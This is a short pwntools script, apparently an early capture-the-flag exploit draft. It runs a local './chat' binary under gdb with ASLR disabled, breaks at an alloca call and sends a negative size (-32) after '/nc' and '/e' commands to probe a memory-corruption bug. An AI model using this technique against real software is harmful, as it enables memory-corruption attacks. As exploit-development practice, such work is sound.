from pwn import *


binpath = './chat'
elf = ELF(binpath)

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']

gdbscript = '''
gef
# block where alloca is called
b *0x0804A271
'''
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)

io.sendline(b'/nc')
io.recvline()
io.sendline(b'/e')
size = -32
io.sendline(b'%d' % size)

io.interactive()
